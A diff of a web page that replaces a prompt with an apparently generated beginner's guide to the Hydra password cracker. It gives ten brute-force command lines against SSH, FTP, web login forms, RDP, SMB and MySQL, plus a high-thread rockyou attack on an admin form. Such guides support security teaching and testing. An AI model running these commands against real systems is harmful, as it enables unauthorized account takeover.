@@ -123,19 +123,68 @@
         <div class="markdown-content">
             <hr />
 <h1>Hydra Command Guide</h1>
-<p>Please generate a detailed educational guide for the <strong>Hydra</strong> tool.<br />
-Follow this structure exactly:</p>
-<ol>
-<li><strong>Brief Explanation</strong>: Explain what Hydra is and why it's used in cybersecurity.</li>
-<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
-<li>For EACH command, provide the exact syntax in a code block.</li>
-<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
-<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
-</ul>
-</li>
-<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
-</ol>
-<p><strong>Tone</strong>: Educational, for a beginner student.</p>
+<p><strong>Hydra</strong> is a legendary parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, allowing researchers to demonstrate the risk of weak credentials.</p>
+<h2>Top 10 Useful Commands</h2>
+<h3>1. Basic SSH Crack</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>fulluser<span class="w"> </span>-P<span class="w"> </span>passlist.txt<span class="w"> </span>ssh://192.168.1.1
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Attacks SSH using a known username (<code>-l</code>) and a password list (<code>-P</code>).</p>
+<h3>2. User &amp; Pass List (Unknown Creds)</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-L<span class="w"> </span>userlist.txt<span class="w"> </span>-P<span class="w"> </span>passlist.txt<span class="w"> </span>ftp://192.168.1.1
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Tries every combination of username (<code>-L</code>) and password against an FTP server.</p>
+<h3>3. HTTP Post Form Crack</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passlist.txt<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:user=^USER^&amp;pass=^PASS^:F=Login failed&quot;</span>
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Cracks web logins. You specify the path, the body parameters (replacing user/pass with placeholders), and the Failure string (<code>F=</code>).</p>
+<h3>4. RDP Cracking</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>Administrator<span class="w"> </span>-P<span class="w"> </span>passlist.txt<span class="w"> </span>rdp://192.168.1.1
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Targets Remote Desktop Protocol. Note: RDP can be slow and lock accounts quickly.</p>
+<h3>5. SMB (Windows) Cracking</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-L<span class="w"> </span>userlist.txt<span class="w"> </span>-P<span class="w"> </span>passlist.txt<span class="w"> </span>smb://192.168.1.1
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Attacks Windows file sharing (SMB). Useful for initial Active Directory access.</p>
+<h3>6. Show Attempts (Debug)</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-V<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Verbose mode (<code>-V</code>). Shows every login attempt (user:pass combination). Good for checking progress.</p>
+<h3>7. Limit Threads (Stealth/Stability)</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Limits concurrent tasks to 4. Essential for older services (like Telnet) that crash under load.</p>
+<h3>8. Exit on Success</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-f<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Stops the entire scan as soon as ONE valid password is found (<code>-f</code>). Saves time.</p>
+<h3>9. MySQL Cracking</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>mysql://192.168.1.1
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Direct brute-force against a backend database port (3306).</p>
+<h3>10. Save Output</h3>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target<span class="w"> </span>-o<span class="w"> </span>found.txt
+</code></pre></div>
+
+<p><strong>Explanation:</strong> Saves found credentials to a file.</p>
+<h2>The Most Powerful Command</h2>
+<p>The most effective way to use Hydra against a web form (the most common modern use case):</p>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="m">10</span>.10.10.5<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Invalid username&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">64</span><span class="w"> </span>-f<span class="w"> </span>-V
+</code></pre></div>
+
+<p><strong>Why it's powerful:</strong><br />
+*   <strong>Targeted Protocol</strong>: Precise targeting of a specific web form.<br />
+*   <strong>Fast</strong>: Uses 64 threads (<code>-t 64</code>).<br />
+*   <strong>Efficiency</strong>: Stops on first success (<code>-f</code>).<br />
+*   <strong>Verification</strong>: Verbose output (<code>-V</code>) lets you verify the error string logic is working.</p>
         </div>
     </main>
 
